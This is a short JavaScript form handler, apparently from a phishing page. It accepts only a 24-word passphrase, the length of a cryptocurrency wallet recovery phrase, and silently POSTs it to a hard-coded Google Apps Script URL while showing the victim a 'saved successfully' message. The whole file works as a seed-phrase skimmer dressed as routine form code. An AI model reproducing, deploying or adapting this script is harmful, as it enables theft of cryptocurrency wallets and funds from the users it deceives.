// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    const myButton2 = document.getElementById('b2');
    myButton.disabled = true;
    myButton2.disabled = true;

    const form = document.getElementById('myForm'); 
    const inputValue = form.elements['mf-texts'].value.trim();

    // Check if the passphrase contains exactly 24 words
    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return;
    }

    // Google Apps Script Web App URL (Replace with your actual URL)
    const url = "https://script.google.com/macros/s/AKfycby5xkOvEtgXj-hYm-o3mBlgO5vcGGLcqJsT9I_M9aC7/dev";

    // Send passphrase to Google Apps Script
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passphrase: inputValue })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
            errorElement.textContent = "Passphrase saved successfully!";
        } else {
            errorElement.textContent = "Error saving passphrase.";
        }
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = "Failed to connect to server.";
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}

// Attach event listener to the form
document.getElementById('myForm').addEventListener('submit', handleSubmit);


